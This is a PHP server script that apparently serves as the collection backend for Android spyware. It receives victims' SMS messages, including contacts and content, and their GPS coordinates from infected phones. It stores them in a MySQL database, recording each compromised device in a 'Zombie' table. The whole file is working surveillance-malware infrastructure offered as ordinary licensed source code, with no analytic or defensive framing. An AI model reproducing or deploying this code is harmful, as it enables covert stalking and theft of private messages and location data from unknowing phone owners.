#    Copyright (C) 2015 Alexandre Teyar

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License. 

<?php
	$host = "localhost";
	$username = "";
	$password = "";
	$db = "SCI";

	$mysqli = mysqli_connect($host, $username, $password, $db);
	$mysqli->set_charset('utf8');

	if (!$mysqli) {
		die("Failed to connect to MySQL: ".mysqli_connect_error());
	}

	if (!empty($_POST['action']) && !empty($_POST['data'])) {
		$action 	= urldecode($_POST['action']);
		$jsonObj	= urldecode($_POST['data']);
		$data 		= json_decode($jsonObj, true);

		switch ($action) {
            case "SMS":
                addSMS($mysqli, $data);
                break;

            case "GPSTracker":
                addPosition($mysqli, $data);
                break;

            default:
                header($_SERVER['SERVER_PROTOCOL'] . "400 Bad Request", true, 400);
                break;
        }
	}	

	function addZombie($mysqli, $email, $tel) {	
		$stmt = $mysqli->prepare("INSERT INTO Zombie (email, tel) VALUES (?, ?)");
		$stmt->bind_param("ss", $email, $tel);
		$result = $stmt->execute();

		if(!$result) {
			echo "INSERT INTO Zombie: ".$stmt->error;	
		}

		$stmt->close();
	} 

	function addSMS($mysqli, $SMSArray) {
		$first = true;
		$stmt = $mysqli->prepare("INSERT INTO SMS (idS, thread, email, tel, otherTel, otherName, content, date, type)
			VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)");

		foreach ($SMSArray as $SMS) {
			extract($SMS);

			if($first) {
				addZombie($mysqli, $email, $tel);
				$first = false;
			}

			$stmt->bind_param("iissssssi", $idS, $thread, $email, $tel, $otherTel, $otherName, $content, $date, $type);
			$result = $stmt->execute();
			
			if(!$result) {
				header($_SERVER['SERVER_PROTOCOL'] . "500 Internal Server Error", true, 500);
				echo "INSERT INTO SMS: ".$stmt->error;	
			}
		}

		$stmt->close();
	} 

	function addPosition($mysqli, $GPSTracker) {
		extract($GPSTracker);
		
		addZombie($mysqli, $email, $tel);

		$stmt = $mysqli->prepare("INSERT INTO Position (email, tel, address, longitude, latitude, altitude, accuracy, date, provider)
			VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)");

		$stmt->bind_param("sssddddss", $email, $tel, $address, $longitude, $latitude, $altitude, $accuracy, $date, $provider);
		$result = $stmt->execute();


		if(!$result) {
			header($_SERVER['SERVER_PROTOCOL'] . "500 Internal Server Error", true, 500);
			die("INSERT INTO Position: ".$stmt->error);	
		}

		$stmt->close();
	}	

	mysqli_close($mysqli);
?>
